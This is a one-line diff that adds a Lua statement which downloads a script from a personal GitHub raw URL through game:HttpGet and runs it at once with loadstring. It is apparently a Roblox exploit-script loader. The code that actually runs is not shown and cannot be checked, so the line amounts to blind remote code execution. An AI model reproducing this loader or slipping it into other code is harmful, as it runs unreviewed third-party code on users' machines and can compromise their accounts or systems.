@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AshleyCanis/Qq/refs/heads/main/Ashley"))()
